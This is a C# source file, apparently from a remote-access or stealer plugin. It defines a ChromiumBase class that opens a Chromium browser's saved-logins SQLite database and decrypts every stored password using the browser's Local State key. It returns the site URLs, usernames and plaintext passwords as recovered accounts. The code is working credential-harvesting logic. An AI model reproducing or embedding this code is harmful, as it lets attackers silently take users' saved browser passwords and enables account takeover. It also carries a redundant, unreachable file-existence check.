

using InvokedCommon.Models;
using Plugin.Helper.Utilities;
using System;
using System.Collections.Generic;
using System.IO;


namespace Plugin.Helper.Browsers
{
	public abstract class ChromiumBase : IAccountReader
	{
		public abstract string ApplicationName { get; }

		public abstract IEnumerable<RecoveredAccount> ReadAccounts();

		protected List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath)
		{
			List<RecoveredAccount> recoveredAccountList = new List<RecoveredAccount>();
			if (!File.Exists(filePath))
				throw new FileNotFoundException("Can not find chromium logins file");
			if (!File.Exists(filePath))
				return recoveredAccountList;
			ChromiumDecryptor chromiumDecryptor = new ChromiumDecryptor(localStatePath);
			SQLiteHandler sqLiteHandler;
			try
			{
				sqLiteHandler = new SQLiteHandler(filePath);
			}
			catch (Exception ex)
			{
				return recoveredAccountList;
			}
			if (!sqLiteHandler.ReadTable("logins"))
				return recoveredAccountList;
			for (int row_num = 0; row_num < sqLiteHandler.GetRowCount(); ++row_num)
			{
				try
				{
					string str1 = sqLiteHandler.GetValue(row_num, "origin_url");
					string str2 = sqLiteHandler.GetValue(row_num, "username_value");
					string str3 = chromiumDecryptor.Decrypt(sqLiteHandler.GetValue(row_num, "password_value"));
					if (!string.IsNullOrEmpty(str1))
					{
						if (!string.IsNullOrEmpty(str2))
							recoveredAccountList.Add(new RecoveredAccount()
							{
								Url = str1,
								Username = str2,
								Password = str3,
								Application = this.ApplicationName
							});
					}
				}
				catch (Exception ex)
				{
				}
			}
			return recoveredAccountList;
		}
	}
}
